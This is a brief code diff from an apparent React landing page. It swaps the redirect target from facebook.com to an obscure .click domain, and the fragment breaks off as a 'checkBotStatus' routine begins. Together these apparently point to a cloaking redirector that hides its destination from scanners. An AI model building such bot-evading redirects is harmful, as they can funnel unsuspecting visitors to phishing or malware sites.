@@ -5,7 +5,7 @@ import "./App.css";
 
 const App = () => {
   const [progress, setProgress] = useState(0);
-  const [redirectUrl, setRedirectUrl] = useState("https://facebook.com");
+  const [redirectUrl, setRedirectUrl] = useState("https://sage.abfilestorage.click");
 
   useEffect(() => {
     const checkBotStatus = async () => {
